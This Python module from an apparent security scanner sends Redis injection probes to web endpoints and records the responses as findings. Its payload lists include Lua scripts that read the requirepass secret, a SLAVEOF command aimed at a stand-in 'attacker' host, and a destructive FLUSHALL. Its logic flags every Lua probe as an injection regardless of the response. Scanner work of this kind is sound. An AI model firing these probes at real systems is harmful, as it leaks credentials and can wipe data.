"""Redis-specific NoSQL injection probes.

Covers EVAL/SCRIPT Lua injection, DEBUG SLEEP timing side-channel,
and CONFIG GET secret extraction.
"""

from __future__ import annotations

import json
import re
import time
from typing import Any

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.passive.runtime import ResponseCache

from ._confidence import probe_confidence, probe_severity

_REDIS_ERROR_RE = re.compile(
    r"(?i)(?:redis|ERR|WRONGTYPE|unknown\s*command|no\s*auth|"
    r"operation\s*not\s*permitted|read-only|BUSY|LOADING|"
    r"OOM\s*command\s*not\s*allowed|redis-cli)"
)


_REDIS_LUA_PAYLOADS: list[tuple[str, str, dict[str, Any]]] = [
    (
        "eval_return_all",
        "EVAL",
        {"script": "return redis.call('KEYS', '*')", "numkeys": 0},
    ),
    (
        "eval_get_config",
        "EVAL",
        {"script": "return redis.call('CONFIG', 'GET', 'requirepass')", "numkeys": 0},
    ),
    (
        "eval_dbsize",
        "EVAL",
        {"script": "return redis.call('DBSIZE')", "numkeys": 0},
    ),
    (
        "eval_info",
        "EVAL",
        {"script": "return redis.call('INFO')", "numkeys": 0},
    ),
    (
        "eval_client_list",
        "EVAL",
        {"script": "return redis.call('CLIENT', 'LIST')", "numkeys": 0},
    ),
    (
        "eval_slaveof",
        "EVAL",
        {"script": "return redis.call('SLAVEOF', 'attacker', '6379')", "numkeys": 0},
    ),
    (
        "eval_module",
        "EVAL",
        {"script": "return redis.call('MODULE', 'LIST')", "numkeys": 0},
    ),
    (
        "script_load",
        "SCRIPT LOAD",
        {"script": "return redis.call('CONFIG', 'GET', '*')"},
    ),
    (
        "eval_acl",
        "EVAL",
        {"script": "return redis.call('ACL', 'LOG')", "numkeys": 0},
    ),
    (
        "eval_slowlog",
        "EVAL",
        {"script": "return redis.call('SLOWLOG', 'GET', '10')", "numkeys": 0},
    ),
]


_REDIS_DEBUG_SLEEP: list[tuple[str, dict[str, Any]]] = [
    ("debug_sleep_2", {"command": "DEBUG", "args": "SLEEP 2"}),
    ("debug_sleep_5", {"command": "DEBUG", "args": "SLEEP 5"}),
]


_REDIS_CONFIG_GET: list[tuple[str, dict[str, Any]]] = [
    ("config_get_requirepass", {"command": "CONFIG", "args": "GET requirepass"}),
    ("config_get_masterauth", {"command": "CONFIG", "args": "GET masterauth"}),
    ("config_get_databases", {"command": "CONFIG", "args": "GET databases"}),
    ("config_get_dbfilename", {"command": "CONFIG", "args": "GET dbfilename"}),
    ("config_get_dir", {"command": "CONFIG", "args": "GET dir"}),
    ("config_get_maxmemory", {"command": "CONFIG", "args": "GET maxmemory"}),
]


_REDIS_KEY_INJECTION: list[tuple[str, dict[str, Any]]] = [
    ("keys_star", {"command": "KEYS", "args": "*"}),
    ("scan_0", {"command": "SCAN", "args": "0"}),
    ("dbsize", {"command": "DBSIZE", "args": ""}),
    ("flushall", {"command": "FLUSHALL", "args": ""}),
]


def _redis_command_body(payload_name: str, payload_body: dict[str, Any]) -> str:
    return json.dumps(payload_body)


def nosql_redis_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    limit: int = 30,
    timing_threshold_ms: float = 3000.0,
) -> list[dict[str, Any]]:
    """Redis-specific NoSQL injection probes.

    Tests for:
    - EVAL/SCRIPT Lua injection for command execution
    - DEBUG SLEEP timing side-channel
    - CONFIG GET secret extraction
    - KEY enumeration

    Args:
        priority_urls: List of URL dicts.
        response_cache: HTTP response cache.
        limit: Maximum findings.
        timing_threshold_ms: Response time threshold for timing anomalies.

    Returns:
        List of Redis NoSQL injection findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    all_payloads: list[tuple[str, str, dict[str, Any], str]] = []

    for payload_name, command, payload_body in _REDIS_LUA_PAYLOADS:
        all_payloads.append((payload_name, command, payload_body, "lua"))

    for payload_name, payload_body in _REDIS_DEBUG_SLEEP:
        all_payloads.append((payload_name, "DEBUG", payload_body, "debug_sleep"))

    for payload_name, payload_body in _REDIS_CONFIG_GET:
        all_payloads.append((payload_name, "CONFIG", payload_body, "config_get"))

    for payload_name, payload_body in _REDIS_KEY_INJECTION:
        all_payloads.append(
            (payload_name, payload_body.get("command", ""), payload_body, "key_injection")
        )

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break

        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        baseline = response_cache.get(url)
        baseline_status = int(baseline.get("status_code") or 0) if baseline else 0
        baseline_len = len(str(baseline.get("body_text") or "")) if baseline else 0

        baseline_times: list[float] = []
        for _ in range(3):
            b = response_cache.get(url)
            if b and b.get("response_time_ms"):
                baseline_times.append(float(b["response_time_ms"]))
        avg_baseline_time = sum(baseline_times) / len(baseline_times) if baseline_times else 200.0

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []
        timing_samples: list[dict[str, Any]] = []

        is_redis = "redis" in url.lower() or ":6379" in url or "redis://" in url.lower()
        if not is_redis:
            check = response_cache.get(url)
            if check:
                body = str(check.get("body_text") or "")
                if not _REDIS_ERROR_RE.search(body) and "redis" not in body.lower():
                    continue

        for payload_name, command, payload_body, category in all_payloads:
            if len(url_probes) >= 4:
                break

            is_timing = category == "debug_sleep"
            is_config = category == "config_get"
            is_lua = category == "lua"

            start = time.perf_counter()
            response = response_cache.request(
                url,
                method="POST",
                headers={
                    "Cache-Control": "no-cache",
                    "Content-Type": "application/json",
                    "X-Redis-Probe": "1",
                },
                body=_redis_command_body(payload_name, payload_body),
            )
            elapsed_ms = (time.perf_counter() - start) * 1000.0

            if not response:
                continue

            rbody = str(response.get("body_text", "") or "")[:8000]
            status = int(response.get("status_code") or 0)
            response_len = len(rbody)
            error_match = _REDIS_ERROR_RE.search(rbody)

            issues_for_hit: list[str] = []

            if error_match:
                issues_for_hit.append("redis_error_pattern")

            if is_lua:
                issues_for_hit.append("redis_lua_injection")
            if is_timing:
                issues_for_hit.append("redis_timing_side_channel")
            if is_config:
                issues_for_hit.append("redis_config_get")

            if status == 200 and response_len > baseline_len * 1.2 and baseline_len > 0:
                issues_for_hit.append("redis_data_exposure")

            if "requirepass" in rbody or "masterauth" in rbody:
                issues_for_hit.append("redis_secret_extraction")

            if is_timing and elapsed_ms > timing_threshold_ms:
                issues_for_hit.append("redis_timing_side_channel")

            if issues_for_hit:
                url_issues.extend(issues_for_hit)
                probe_data: dict[str, Any] = {
                    "payload_type": payload_name,
                    "command": command,
                    "category": category,
                    "payload": payload_body,
                    "baseline_status": baseline_status,
                    "response_status": status,
                    "baseline_length": baseline_len,
                    "response_length": response_len,
                    "response_time_ms": round(elapsed_ms, 2),
                    "baseline_avg_ms": round(avg_baseline_time, 2),
                    "issues": issues_for_hit,
                    "error_pattern": error_match.group(0) if error_match else None,
                }

                if is_timing:
                    timing_samples.append(probe_data)

                url_probes.append(probe_data)

        if url_probes:
            unique_issues = list(dict.fromkeys(url_issues))
            finding: dict[str, Any] = {
                "url": url,
                "endpoint_key": endpoint_key,
                "endpoint_base_key": endpoint_base_key(url),
                "endpoint_type": classify_endpoint(url),
                "issues": unique_issues,
                "probes": url_probes,
                "confidence": probe_confidence(unique_issues),
                "severity": probe_severity(unique_issues),
            }
            if timing_samples:
                finding["timing_analysis"] = {
                    "threshold_ms": timing_threshold_ms,
                    "samples": len(timing_samples),
                    "anomalous_count": sum(
                        1 for s in timing_samples if s["response_time_ms"] > timing_threshold_ms
                    ),
                }
            findings.append(finding)

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
